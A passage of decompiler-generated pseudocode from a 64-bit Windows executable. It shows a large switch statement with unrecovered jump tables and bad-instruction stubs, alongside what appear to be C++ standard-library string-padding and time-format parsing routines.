*puVar60 + uVar64;\n        uVar50 = puVar60 + 0x14010;\n        cVar40 = uVar50;\n        *uVar50 = *uVar50 + cVar40;\n        pcVar54 = uVar50;\n        *pcVar54 = *pcVar54 + cVar40;\n        *pcVar54 = *pcVar54 + cVar40;\n        *pcVar54 = *pcVar54 + cVar40;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x52:\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar41;\n        *(unaff_RBP + 0x5003f80c5) = *(unaff_RBP + 0x5003f80c5) + '(';\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x53:\ncode_r0x00014003f026:\n        uVar50 = *(unaff_RSI + 3);\n        puVar85 = UNRECOVERED_JUMPTABLE._0_8_ + unaff_R12;\n        if ((uVar50 & 0x200) != 0) {\n            puVar85 = puVar85 + arg1[6];\n        }\n        in_stack_00000058 = &stack0x00000068;\n        piStack24 = &stack0x00000058;\n        in_stack_00000060 = NULL;\n        in_stack_00000068 = 0;\n        ppiVar65 = in_stack_00000058;\n        fcn.1400a6b00(piStack24, puVar85 * 2);\n        piVar84 = unaff_RSI[2];\n        puVar82 = &stack0x00000030 + 4;\n        do {\n            if (*puVar82 < 5) {\n                UNRECOVERED_JUMPTABLE._0_8_ = *(*puVar82 * 4 + 0x1400fe170) + 0x1400fe170;\n                goto code_r0x00014003f0c8;\n            }\n            puVar82 = puVar82 + 1;\n        } while (CONCAT44(iStack44, CONCAT22(iStack46, uStack48)) != puVar82);\n        if (UNRECOVERED_JUMPTABLE._0_8_ < 2) {\ncode_r0x00014003f266:\n            piVar80 = in_stack_00000060;\n            if (in_stack_00000060 < piVar84) {\n                piVar80 = piVar84;\n                if ((uVar50 & 0xb0) == 0x20) {\n                    fcn.1400a5030(piStack24, in_stack_00000060, 0, piVar84 - in_stack_00000060);\n                }\n                else {\n                    fcn.1400a5030(piStack24, 0, 0, piVar84 - in_stack_00000060);\n                }\n            }\n            uVar59 = unaff_R13 & 0xffffffff;\n            if ((unaff_R13 == '\\0') &&\n               (iVar58 = (**(*piStack56 + 0x60))(piStack56, in_stack_00000058, piVar80),  piVar80 != iVar58)) {\n                uVar59 = 1;\n            }\n            if (in_stack_00000058 != ppiVar65) {\n                fcn.1400b64d0(in_stack_00000058);\n            }\n            if (CONCAT62(in_stack_0000003a, in_stack_00000038) != in_stack_00000000) {\n                fcn.1400b64d0();\n            }\n            unaff_RSI[2] = NULL;\n            in_stack_000000c8[1] = unaff_R13 & 0xffffffffffffff00 | uVar59 & 0xff;\n            *in_stack_000000c8 = piStack56;\n            return in_stack_000000c8;\n        }\n        UNRECOVERED_JUMPTABLE._0_8_ = UNRECOVERED_JUMPTABLE._0_8_ - 1;\n        if (UNRECOVERED_JUMPTABLE._0_8_ <= 0x1fffffffffffffff - in_stack_00000060) {\n            fcn.1400a6c40(piStack24, piStack16 + 2, UNRECOVERED_JUMPTABLE._0_8_);\n            goto code_r0x00014003f266;\n        }\ncode_r0x00014003f604:\n        fcn.1400b7170(0x1400fe0e2);\n        unaff_R14 = UNRECOVERED_JUMPTABLE._0_8_;\n        break;\n    case 0x54:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x55:\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar41;\n        iVar66 = unaff_RBP;\n        if (uVar51 < 0) {\n            iVar66 = unaff_R14;\n        }\n        if (arg1[3] == NULL) {\n            ppiVar83 = unaff_RDI;\n            fcn.1400a46d0(CONCAT44(iStack44, CONCAT22(iStack46, uStack48)), 0, unaff_R12, unaff_RDI);\n            iVar49 = *(arg1 + 0xb);\n        }\n        else {\n            fcn.1400a5030(CONCAT44(iStack44, CONCAT22(iStack46, uStack48)), 0, unaff_R12, iVar66 * 2);\n            iVar58 = CONCAT62(in_stack_0000003a, in_stack_00000038);\n            iVar56 = fcn.1400b0190(iVar58, *(arg1 + 0x24), arg1[2], arg1[3]);\n            iVar56 = iVar56 - iVar58;\n            ppiVar65 = iVar56 >> 1;\n            ppiVar83 = in_stack_00000040;\n            if (in_stack_00000040 < ppiVar65) goto code_r0x00014003f61c;\n            *(CONCAT62(in_stack_0000003a, in_stack_00000038) + iVar56) = 0;\n            iVar49 = *(arg1 + 0xb);\n            in_stack_00000040 = ppiVar65;\n        }\n        ppiVar65 = in_stack_00000040;\n        unaff_R12 = in_stack_00000040;\n        if (iVar49 < 1) goto code_r0x00014003f026;\n        ppiVar52 = in_stack_00000040 + 1;\n        piStack24 = piStack24 & 0xffffffffffff0000 | *(arg1 + 0x22);\n        ppiVar74 = CONCAT62(in_stack_0000003a, in_stack_00000038);\n        if (ppiVar74 == in_stack_00000000) {\n            ppiVar83 = 0x7;\n        }\n        else {\n            ppiVar83 = CONCAT44(in_stack_0000004c, in_stack_00000048);\n        }\n        if (ppiVar83 < ppiVar52) {\n            fcn.1400a6e10(CONCAT44(iStack44, CONCAT22(iStack46, uStack48)), in_stack_00000040, 0, 0);\n            ppiVar74 = CONCAT62(in_stack_0000003a, in_stack_00000038);\n        }\n        ppiVar83 = NULL;\n        *(ppiVar74 + ppiVar65 * 2) = piStack24._0_2_;\n        *(ppiVar74 + ppiVar65 * 2 + 2) = 0;\n        in_stack_00000040 = ppiVar52;\n        if (iVar66 < 0) {\n            UNRECOVERED_JUMPTABLE._0_8_ = NULL;\n            ppiVar83 = -iVar66;\n            fcn.1400a5030(CONCAT44(iStack44, CONCAT22(iStack46, uStack48)), ppiVar52, 0, ppiVar83);\n            if (unaff_R14 <= 0x1fffffffffffffff - in_stack_00000040) goto code_r0x00014003f3a9;\n            fcn.1400b7170(0x1400fe0e2);\n            goto code_r0x00014003f604;\n        }\n        unaff_R14 = *(arg1 + 0xb);\n        unaff_RDI = unaff_RDI + iVar66 * 2;\n        if (unaff_R14 <= 0x1fffffffffffffff - ppiVar52) {\ncode_r0x00014003f3a9:\n            fcn.1400a6c40(CONCAT44(iStack44, CONCAT22(iStack46, uStack48)), unaff_RDI, unaff_R14);\n            unaff_R12 = in_stack_00000040;\n            goto code_r0x00014003f026;\n        }\n        break;\n    case 0x56:\ncode_r0x00014003f0c8:\n    // WARNING: Could not recover jumptable at 0x00014003f0cc. Too many branches\n    // WARNING: Treating indirect jump as call\n        ppiVar65 = (*UNRECOVERED_JUMPTABLE._0_8_)();\n        return ppiVar65;\n    case 0x57:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x58:\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar41;\n        goto code_r0x00014003e786;\n    case 0x59:\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar41;\n        ppiVar75 = &piStack104;\ncode_r0x00014003e6fb:\n        uVar50 = unaff_RBP;\n        *(ppiVar75 + 0x20) = 0;\n        *(ppiVar75 + -8) = 0x14003e71d;\n        fcn.1400a5030(*(ppiVar75 + 0x38), 0, unaff_R12, uVar50 * 2);\n        iVar58 = *(ppiVar75 + 0xa0);\n        piVar84 = arg1[3];\n        piVar80 = arg1[2];\n        uVar45 = *(arg1 + 0x24);\n        *(ppiVar75 + 0x28) = uVar50 * 2 + unaff_RDI;\n        *(ppiVar75 + 0x20) = unaff_RDI;\n        *(ppiVar75 + -8) = 0x14003e746;\n        iVar56 = fcn.1400b0190(iVar58, uVar45, piVar80, piVar84);\n        ppiVar83 = *(ppiVar75 + 0xa8);\n        iVar56 = iVar56 - iVar58;\n        unaff_R12 = iVar56 >> 1;\n        if (ppiVar83 < unaff_R12) goto code_r0x00014003ed7c;\n        *(ppiVar75 + 0xa8) = unaff_R12;\n        *(*(ppiVar75 + 0xa0) + iVar56) = 0;\n        iVar66 = *(arg1 + 0xb);\n        goto code_r0x00014003e77e;\n    case 0x5a:\n        unaff_R12 = CONCAT44(in_stack_0000004c, in_stack_00000048);\n        iVar66 = piStack104;\n        uVar50 = unaff_R14 - iVar66;\n        unaff_RBP = uVar50;\n        ppiVar75 = auStack96;\n        if (0 < uVar50) {\n            if (iVar66 < 0) {\n                unaff_RBP = unaff_R14 & 0xffffffff;\n            }\n            uVar50 = unaff_RBP;\n            ppiVar75 = auStack96;\n            if (arg1[3] != NULL) goto code_r0x00014003e6fb;\n            piStack104 = 0x14003ec3a;\n            ppiVar83 = unaff_RDI;\n            fcn.1400a46d0(uVar57, 0, unaff_R12, unaff_RDI);\n            iVar66 = *(arg1 + 0xb);\n            unaff_R12 = CONCAT44(in_stack_0000004c, in_stack_00000048);\n            ppiVar75 = auStack96;\n        }\ncode_r0x00014003e77e:\n        if (iVar66 < 1) {\ncode_r0x00014003e786:\n            uVar50 = *(unaff_RSI + 3);\n            *(ppiVar75 + 0x78) = uVar50 & 0xb0;\n            piVar84 = *(ppiVar75 + 0x40) + unaff_R12;\n            if ((uVar50 & 0x200) != 0) {\n                piVar84 = piVar84 + arg1[6];\n            }\n            *(ppiVar75 + 200) = 0;\n            *(ppiVar75 + 0x50) = ppiVar75 + 0xc0;\n            *(ppiVar75 + 0x60) = ppiVar75 + 0xd0;\n            *(ppiVar75 + 0xc0) = ppiVar75 + 0xd0;\n            *(ppiVar75 + 0xd0) = 0;\n            *(ppiVar75 + -8) = 0x14003e7ea;\n            fcn.1400a6b00(ppiVar75 + 0xc0, piVar84 * 2);\n            piVar80 = unaff_RSI[2];\n            puVar82 = ppiVar75 + 0x9c;\n            piVar69 = *(ppiVar75 + 200);\n            *(ppiVar75 + 0x7d) = *(ppiVar75 + 0x78) == 0x10 && piVar84 < piVar80;\n            do {\n                if (*puVar82 < 5) {\n                    switch(*puVar82) {\n                    case 0:\n                        if (*(ppiVar75 + 0x7d) != '\\0') {\ncode_r0x00014003e947:\n                            ppiVar83 = piVar80 - piVar84;\n                            *(ppiVar75 + 0x20) = *(ppiVar75 + 0x4a);\n                            *(ppiVar75 + -8) = 0x14003e966;\n                            fcn.1400a5030(*(ppiVar75 + 0x50), piVar69, 0, ppiVar83);\n                            goto code_r0x00014003e9a0;\n                        }\n                        break;\n                    case 1:\ncode_r0x00014003e8e0:\n                        if (*(ppiVar75 + 0x7d) != '\\0') goto code_r0x00014003e947;\n                        *(ppiVar75 + 0x70) = piVar69 + 1;\n                        iVar58 = *(ppiVar75 + 0xc0);\n                        if (iVar58 == *(ppiVar75 + 0x60)) {\n                            uVar59 = 7;\n                        }\n                        else {\n                            uVar59 = *(ppiVar75 + 0xd0);\n                        }\n                        if (uVar59 < *(ppiVar75 + 0x70)) {\n                            ppiVar83 = NULL;\n                            *(ppiVar75 + 0x20) = 1;\n                            *(ppiVar75 + -8) = 0x14003ed14;\n                            fcn.1400a6e10(*(ppiVar75 + 0x50), piVar69, 0, 0);\n                            iVar58 = *(ppiVar75 + 0xc0);\n                        }\n                        piVar70 = *(ppiVar75 + 0x70);\n                        *(iVar58 + piVar69 * 2) = *(ppiVar75 + 0x4a);\n                        *(ppiVar75 + 200) = piVar70;\n                        *(iVar58 + 2 + piVar69 * 2) = 0;\n                        piVar69 = piVar70;\n                        break;\n                    case 2:\n                        if ((*(unaff_RSI + 0x19) & 2) != 0) {\n                            ppiVar65 = arg1[6];\n                            piVar70 = arg1[5];\n                            if (ppiVar65 <= 0x1fffffffffffffff - piVar69) goto code_r0x00014003e996;\n                            *(ppiVar75 + -8) = 0x14003e8dc;\n                            fcn.1400b7170(0x1400fe0e2);\n                            goto code_r0x00014003e8e0;\n                        }\n                        break;\n                    case 3:\n                        if (*(ppiVar75 + 0x40) != 0) {\n                            *(ppiVar75 + 0x7e) = **(ppiVar75 + 0x58);\n                            *(ppiVar75 + 0x70) = piVar69 + 1;\n                            iVar58 = *(ppiVar75 + 0xc0);\n                            if (iVar58 == *(ppiVar75 + 0x60)) {\n                                uVar59 = 7;\n                            }\n                            else {\n                                uVar59 = *(ppiVar75 + 0xd0);\n                            }\n                            if (uVar59 < *(ppiVar75 + 0x70)) {\n                                ppiVar83 = NULL;\n                                *(ppiVar75 + 0x20) = 1;\n                                *(ppiVar75 + -8) = 0x14003ecb4;\n                                fcn.1400a6e10(*(ppiVar75 + 0x50), piVar69, 0, 0);\n                                iVar58 = *(ppiVar75 + 0xc0);\n                            }\n                            *(iVar58 + piVar69 * 2) = *(ppiVar75 + 0x7e);\n                            piVar70 = *(ppiVar75 + 0x70);\n                            *(ppiVar75 + 200) = piVar70;\n                            *(iVar58 + 2 + piVar69 * 2) = 0;\n                            piVar69 = piVar70;\n                        }\n                        break;\n                    case 4:\n                        ppiVar65 = *(ppiVar75 + 0xa8);\n                        piVar70 = *(ppiVar75 + 0xa0);\n                        if (0x1fffffffffffffff - piVar69 < ppiVar65) {\n                            *(ppiVar75 + -8) = 0x14003ed58;\n                            fcn.1400b7170(0x1400fe0e2);\n                            goto code_r0x00014003ed58;\n                        }\ncode_r0x00014003e996:\n                        *(ppiVar75 + -8) = 0x14003e9a0;\n                        fcn.1400a6c40(*(ppiVar75 + 0x50), piVar70, ppiVar65);\ncode_r0x00014003e9a0:\n                        piVar69 = *(ppiVar75 + 200);\n                    }\n                }\n                puVar82 = puVar82 + 1;\n            } while (*(ppiVar75 + 0x38) != puVar82);\n            if (*(ppiVar75 + 0x40) < 2) {\ncode_r0x00014003e9c6:\n                if (piVar69 < piVar80) {\n                    *(ppiVar75 + 0x20) = *(ppiVar75 + 0x4c);\n                    if (*(ppiVar75 + 0x78) == 0x20) {\n                        *(ppiVar75 + -8) = 0x14003eb6d;\n                        fcn.1400a5030(*(ppiVar75 + 0x50), piVar69, 0, piVar80 - piVar69);\n                        piVar69 = piVar80;\n                    }\n                    else {\n                        *(ppiVar75 + -8) = 0x14003e9f7;\n                        fcn.1400a5030(*(ppiVar75 + 0x50), 0, 0, piVar80 - piVar69);\n                        piVar69 = piVar80;\n                    }\n                }\n                iVar58 = *(ppiVar75 + 0xc0);\n                uVar59 = unaff_R13 & 0xffffffff;\n                if (unaff_R13 == '\\0') {\n                    pcVar3 = *(**(ppiVar75 + 0x30) + 0x60);\n                    *(ppiVar75 + -8) = 0x14003ea1b;\n                    iVar56 = (*pcVar3)(*(ppiVar75 + 0x30), iVar58, piVar69);\n                    iVar58 = *(ppiVar75 + 0xc0);\n                    if (piVar69 != iVar56) {\n                        uVar59 = 1;\n                    }\n                }\n                *(ppiVar75 + 0x88) = uVar59 & 0xff;\n                *(ppiVar75 + 0x80) = *(ppiVar75 + 0x30);\n                if (iVar58 != *(ppiVar75 + 0x60)) {\n                    *(ppiVar75 + -8) = 0x14003ea5b;\n                    fcn.1400b64d0(iVar58);\n                }\n                if (*(ppiVar75 + 0xa0) != *(ppiVar75 + 0x68)) {\n                    *(ppiVar75 + -8) = 0x14003ea76;\n                    fcn.1400b64d0();\n                }\n                ppiVar65 = *(ppiVar75 + 0x130);\n                unaff_RSI[2] = NULL;\n                piVar84 = *(ppiVar75 + 0x30);\n                ppiVar65[1] = unaff_R13 & 0xffffffffffffff00 | uVar59 & 0xff;\n                *ppiVar65 = piVar84;\n                return ppiVar65;\n            }\n            ppiVar65 = *(ppiVar75 + 0x40) - 1;\n            if (ppiVar65 <= 0x1fffffffffffffff - piVar69) {\n                *(ppiVar75 + -8) = 0x14003eb50;\n                fcn.1400a6c40(*(ppiVar75 + 0x50), *(ppiVar75 + 0x58) + 2, ppiVar65);\n                piVar69 = *(ppiVar75 + 200);\n                goto code_r0x00014003e9c6;\n            }\ncode_r0x00014003ed64:\n            *(ppiVar75 + -8) = 0x14003ed70;\n            fcn.1400b7170(0x1400fe0e2);\n            unaff_R14 = ppiVar65;\n        }\n        else {\n            puVar85 = unaff_R12 + 1;\n            *(ppiVar75 + 0x50) = *(arg1 + 0x22);\n            iVar58 = *(ppiVar75 + 0xa0);\n            if (iVar58 == *(ppiVar75 + 0x68)) {\n                puVar71 = 0x7;\n            }\n            else {\n                puVar71 = *(ppiVar75 + 0xb0);\n            }\n            if (puVar71 < puVar85) {\n                *(ppiVar75 + 0x20) = 1;\n                *(ppiVar75 + -8) = 0x14003ece4;\n                fcn.1400a6e10(*(ppiVar75 + 0x38), unaff_R12, 0, 0);\n                iVar58 = *(ppiVar75 + 0xa0);\n            }\n            ppiVar83 = NULL;\n            *(iVar58 + unaff_R12 * 2) = *(ppiVar75 + 0x50);\n            *(ppiVar75 + 0xa8) = puVar85;\n            *(iVar58 + 2 + unaff_R12 * 2) = 0;\n            if (uVar50 < 0) {\n                ppiVar65 = NULL;\n                ppiVar83 = -uVar50;\n                *(ppiVar75 + 0x20) = *(arg1 + 0x66);\n                *(ppiVar75 + -8) = 0x14003ec6d;\n                fcn.1400a5030(*(ppiVar75 + 0x38), puVar85, 0, ppiVar83);\n                if (unaff_R14 <= 0x1fffffffffffffff - *(ppiVar75 + 0xa8)) goto code_r0x00014003eb09;\ncode_r0x00014003ed58:\n                *(ppiVar75 + -8) = 0x14003ed64;\n                fcn.1400b7170(0x1400fe0e2);\n                goto code_r0x00014003ed64;\n            }\n            unaff_R14 = *(arg1 + 0xb);\n            unaff_RDI = unaff_RDI + uVar50 * 2;\n            if (unaff_R14 <= 0x1fffffffffffffff - puVar85) {\ncode_r0x00014003eb09:\n                *(ppiVar75 + -8) = 0x14003eb13;\n                fcn.1400a6c40(*(ppiVar75 + 0x38), unaff_RDI, unaff_R14);\n                unaff_R12 = *(ppiVar75 + 0xa8);\n                goto code_r0x00014003e786;\n            }\n        }\n        *(ppiVar75 + -8) = 0x14003ed7c;\n        fcn.1400b7170(0x1400fe0e2);\n        unaff_R12 = unaff_R14;\ncode_r0x00014003ed7c:\n        *(ppiVar75 + -8) = 0x14003ed8f;\n        uVar57 = fcn.1400b1a60(0x1400fe138, 0x1400fe124, unaff_R12, ppiVar83);\n        *(ppiVar75 + -8) = 0x14003ed97;\n        fcn.1400b6670(uVar57);\n        pcVar3 = (*arg1)[1];\n        *(ppiVar75 + -8) = 0x14003eda0;\n        (*pcVar3)(arg1);\n        do {\n            *(ppiVar75 + -8) = 0x14003eda5;\n            uVar57 = fcn.1400b6b70();\n            *(ppiVar75 + -8) = 0x14003edad;\n            fcn.1400b6670(uVar57);\n        } while( true );\n    case 0x5b:\n        return UNRECOVERED_JUMPTABLE._0_8_;\n    case 0x5c:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x5d:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x5e:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x5f:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x60:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x61:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x62:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 99:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 100:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x65:\ncode_r0x0001400348a2:\n        *(ppiVar73 + 0x20) = UNRECOVERED_JUMPTABLE._0_8_;\n        *(ppiVar73 + 0xe0) = in_XMM6_Da;\n        *(ppiVar73 + 0xe4) = in_XMM6_Db;\n        *(ppiVar73 + 0xe8) = in_XMM6_Dc;\n        *(ppiVar73 + 0xec) = in_XMM6_Dd;\n        *(ppiVar73 + 0xf0) = in_XMM5_Da;\n        *(ppiVar73 + 0xf4) = in_XMM5_Db;\n        *(ppiVar73 + 0xf8) = in_XMM5_Dc;\n        *(ppiVar73 + 0xfc) = in_XMM5_Dd;\n        *(ppiVar73 + 0x100) = in_XMM4_Da;\n        *(ppiVar73 + 0x104) = in_XMM4_Db;\n        *(ppiVar73 + 0x108) = in_XMM4_Dc;\n        *(ppiVar73 + 0x10c) = in_XMM4_Dd;\n        *(ppiVar73 + 0x110) = in_XMM3_Da;\n        *(ppiVar73 + 0x114) = in_XMM3_Db;\n        *(ppiVar73 + 0x118) = in_XMM3_Dc;\n        *(ppiVar73 + 0x11c) = in_XMM3_Dd;\n        *(ppiVar73 + 0x120) = piVar84;\n        *(ppiVar73 + 0x128) = piVar80;\n        *(ppiVar73 + 0x140) = auVar87;\n        *(ppiVar73 + 0xa0) = in_XMM1_Da;\n        *(ppiVar73 + 0xa4) = in_XMM1_Db;\n        *(ppiVar73 + 0xa8) = in_XMM1_Dc;\n        *(ppiVar73 + 0xac) = in_XMM1_Dd;\n        *(ppiVar73 + -8) = 0x1400348e4;\n        fcn.140032f70(ppiVar65, arg3, in_stack_00000030, ppiVar83, *(ppiVar73 + 0x20), *(ppiVar73 + 0x28), \n                      *(ppiVar73 + 0x30), *(ppiVar73 + 0x38), *(ppiVar73 + 0x40), *(ppiVar73 + 0x48), *(ppiVar73 + 0x50)\n                      , *(ppiVar73 + 0x58), *(ppiVar73 + 0x60), *(ppiVar73 + 0x68), *(ppiVar73 + 0x70), \n                      *(ppiVar73 + 0x78), *(ppiVar73 + 0x80));\n        ppiVar83 = *(ppiVar73 + 0xb0);\n        ppiVar74 = ppiVar73;\ncode_r0x0001400348ec:\n        unaff_RSI = *(ppiVar74 + 0xb8);\n        *(ppiVar74 + 0xc0) = ppiVar83;\n        *(ppiVar74 + 200) = *(ppiVar74 + 0xb8);\n        *(ppiVar74 + 100) = *(ppiVar74 + 0xd8);\n        if (*(ppiVar74 + 0xd8) == 0) {\n            *(*(ppiVar74 + 0x280) + 0x18) = *(ppiVar74 + 0xdc) % 7;\n            **(ppiVar74 + 0x290) = **(ppiVar74 + 0x290) | 2;\n        }\ncode_r0x0001400340c1:\n        *(ppiVar74 + 0x58) = *(ppiVar74 + 0x58) + 1;\n        iStack0000000000000060 = unaff_RSI;\njoined_r0x000140033f92:\n        bVar86 = iStack0000000000000060 == -1;\n        uVar41 = arg1;\n        if ((ppiVar83 != NULL) && (bVar86)) {\n            if (ppiVar83[2] < ppiVar83[3]) {\n                iVar46 = *ppiVar83[2];\n            }\n            else {\n                pcVar3 = (*ppiVar83)[9];\n                *(ppiVar74 + -8) = 0x1400344fa;\n                iVar46 = (*pcVar3)(ppiVar83);\n            }\n            if (iVar46 == -1) {\n                *(ppiVar74 + 0xc0) = 0;\n            }\n            bVar77 = unaff_RDI != NULL & uVar41;\n            bVar81 = iVar46 == -1;\n            if (bVar77 != false) goto code_r0x000140034118;\ncode_r0x000140033fb3:\n            if (bVar81 != uVar41) goto code_r0x000140033fbe;\ncode_r0x000140034150:\n            ppiVar65 = *(ppiVar74 + 0x250);\n            puVar60 = *(ppiVar74 + 0x278);\n            if ((*(ppiVar74 + 0x58) == *(ppiVar74 + 0x68)) && (*(ppiVar74 + 100) == 0)) goto code_r0x00014003417b;\ncode_r0x000140034177:\n            *puVar60 = *puVar60 | 4;\ncode_r0x00014003417b:\n            uVar2 = *(ppiVar74 + 0xc4);\n            uVar5 = *(ppiVar74 + 200);\n            uVar6 = *(ppiVar74 + 0xcc);\n            *ppiVar65 = *(ppiVar74 + 0xc0);\n            *(ppiVar65 + 4) = uVar2;\n            *(ppiVar65 + 1) = uVar5;\n            *(ppiVar65 + 0xc) = uVar6;\n            return ppiVar65;\n        }\n        bVar77 = unaff_RDI != NULL & uVar41;\n        bVar81 = bVar86;\n        if (bVar77 == false) goto code_r0x000140033fb3;\ncode_r0x000140034118:\n        if (unaff_RDI[2] < unaff_RDI[3]) {\n            iVar46 = *unaff_RDI[2];\n        }\n        else {\n            pcVar3 = (*unaff_RDI)[9];\n            *(ppiVar74 + -8) = 0x1400344e1;\n            iVar46 = (*pcVar3)(unaff_RDI);\n        }\n        if (iVar46 == -1) {\n            unaff_RDI = NULL;\n        }\n        else {\n            bVar77 = false;\n        }\n        if (bVar81 == bVar77) goto code_r0x000140034150;\ncode_r0x000140033fbe:\n        iVar46 = unaff_RSI;\n        if (*(ppiVar74 + 0x68) <= *(ppiVar74 + 0x58)) goto code_r0x000140034150;\n        if (*(ppiVar74 + 100) != 0) {\n            ppiVar65 = *(ppiVar74 + 0x250);\n            puVar60 = *(ppiVar74 + 0x278);\n            goto code_r0x000140034177;\n        }\n        pcVar3 = (*ppiVar52)[0xc];\n        *(ppiVar74 + -8) = 0x140033fff;\n        cVar40 = (*pcVar3)(ppiVar52);\n        if (cVar40 != '%') {\n            pcVar3 = (*ppiVar52)[2];\n            *(ppiVar74 + -8) = 0x14003401a;\n            cVar40 = (*pcVar3)(ppiVar52);\n            ppiVar83 = *(ppiVar74 + 0xc0);\n            if (cVar40 == '\\0') {\n                cVar40 = ppiVar83 != NULL;\n                pcVar3 = (*ppiVar52)[8];\n                *(ppiVar74 + -8) = 0x14003403f;\n                uVar44 = (*pcVar3)(ppiVar52);\n                *(ppiVar74 + 0x70) = uVar44;\n                bVar77 = bVar86 && cVar40;\n                if (bVar77) {\n                    if (ppiVar83[2] < ppiVar83[3]) {\n                        iVar46 = *ppiVar83[2];\n                        cVar40 = bVar77;\n                    }\n                    else {\n                        piVar84 = *ppiVar83;\n                        *(ppiVar74 + 0x88) = bVar77;\n                        pcVar3 = piVar84[9];\n                        *(ppiVar74 + -8) = 0x140035b59;\n                        iVar46 = (*pcVar3)(ppiVar83);\n                        cVar40 = *(ppiVar74 + 0x88);\n                    }\n                    if (iVar46 == -1) {\n                        *(ppiVar74 + 0xc0) = 0;\n                        cVar40 = '\\0';\n                        ppiVar83 = NULL;\n                    }\n                }\n                pcVar3 = (*ppiVar52)[8];\n                *(ppiVar74 + -8) = 0x14003405d;\n                iVar46 = (*pcVar3)(ppiVar52);\n                if (*(ppiVar74 + 0x70) != iVar46) {\n                    pcVar3 = (*ppiVar52)[6];\n                    *(ppiVar74 + -8) = 0x140034076;\n                    iVar46 = (*pcVar3)(ppiVar52);\n                    if ((bVar86) && (cVar40 != '\\0')) {\n                        if (ppiVar83[2] < ppiVar83[3]) {\n                            iVar47 = *ppiVar83[2];\n                        }\n                        else {\n                            pcVar3 = (*ppiVar83)[9];\n                            *(ppiVar74 + -8) = 0x140034a2e;\n                            iVar47 = (*pcVar3)(ppiVar83);\n                        }\n                        if (iVar47 == -1) {\n                            *(ppiVar74 + 0xc0) = 0;\n                        }\n                    }\n                    pcVar3 = (*ppiVar52)[6];\n                    *(ppiVar74 + -8) = 0x140034094;\n                    iVar47 = (*pcVar3)(ppiVar52);\n                    ppiVar83 = *(ppiVar74 + 0xc0);\n                    if (iVar46 != iVar47) goto code_r0x0001400340a6;\n                }\n                goto code_r0x000140034240;\n            }\n            unaff_R14 = NULL;\n            while( true ) {\n                uVar43 = unaff_RSI == -1;\n                uVar41 = ppiVar83 != NULL && uVar43;\n                if (ppiVar83 != NULL && uVar43) {\n                    if (ppiVar83[2] < ppiVar83[3]) {\n                        iVar46 = *ppiVar83[2];\n                    }\n                    else {\n                        piVar84 = *ppiVar83;\n                        *(ppiVar74 + 0x70) = uVar41;\n                        pcVar3 = piVar84[9];\n                        *(ppiVar74 + -8) = 0x14003449e;\n                        iVar46 = (*pcVar3)(ppiVar83);\n                        uVar41 = *(ppiVar74 + 0x70);\n                    }\n                    uVar43 = 0;\n                    if (iVar46 == -1) {\n                        ppiVar83 = NULL;\n                        *(ppiVar74 + 0xc0) = 0;\n                        uVar43 = uVar41;\n                        uVar41 = 0;\n                    }\n                }\n                uVar64 = unaff_RDI != NULL & arg1;\n                uVar42 = arg1;\n                if (uVar64 != 0) {\n                    if (unaff_RDI[2] < unaff_RDI[3]) {\n                        iVar46 = *unaff_RDI[2];\n                    }\n                    else {\n                        piVar84 = *unaff_RDI;\n                        *(ppiVar74 + 0x70) = uVar41;\n                        pcVar3 = piVar84[9];\n                        *(ppiVar74 + -8) = 0x140034485;\n                        iVar46 = (*pcVar3)(unaff_RDI);\n                        uVar41 = *(ppiVar74 + 0x70);\n                    }\n                    if (iVar46 == -1) {\n                        unaff_RDI = NULL;\n                        uVar42 = uVar64;\n                    }\n                    else {\n                        uVar42 = unaff_R14;\n                    }\n                }\n                if (uVar43 == uVar42) break;\n                if (uVar41 != 0) {\n                    ppiVar72 = ppiVar74;\n                    unaff_R12 = ppiVar52;\n                    if (ppiVar83[2] < ppiVar83[3]) {\n                        in_stack_00000030 = *ppiVar83[2];\n                    }\n                    else {\n                        pcVar3 = (*ppiVar83)[9];\n                        *(ppiVar74 + -8) = 0x1400344ca;\n                        uVar45 = (*pcVar3)(ppiVar83);\n                        in_stack_00000030 = uVar45;\n                    }\ncode_r0x000140034382:\n                    ppiVar74 = ppiVar72;\n                    ppiVar52 = unaff_R12;\n                    if (in_stack_00000030 == -1) {\n                        *(ppiVar72 + 0xc0) = 0;\n                        ppiVar83 = NULL;\n                    }\n                }\n                pcVar3 = (*ppiVar52)[2];\n                *(ppiVar74 + -8) = 0x1400342ae;\n                cVar40 = (*pcVar3)(ppiVar52);\n                if (cVar40 == '\\0') break;\n                if (ppiVar83[2] < ppiVar83[3]) {\n                    ppiVar83[2] = ppiVar83[2] + 2;\n                }\n                else {\n                    pcVar3 = (*ppiVar83)[10];\n                    *(ppiVar74 + -8) = 0x1400343da;\n                    (*pcVar3)(ppiVar83);\n                }\n                unaff_RSI = 0xffffffff;\n                *(ppiVar74 + 200) = 0xffff;\n            }\n            goto code_r0x0001400340c1;\n        }\n        pcVar3 = (*ppiVar52)[0xc];\n        *(ppiVar74 + -8) = 0x1400341f2;\n        cVar40 = (*pcVar3)(ppiVar52);\n        *(ppiVar74 + 0xdc) = 0;\n        if ((cVar40 == 'E') || (cVar40 == 'O')) {\n            *(ppiVar74 + 0x58) = *(ppiVar74 + 0x58) + 2;\n            pcVar3 = (*ppiVar52)[0xc];\n            *(ppiVar74 + 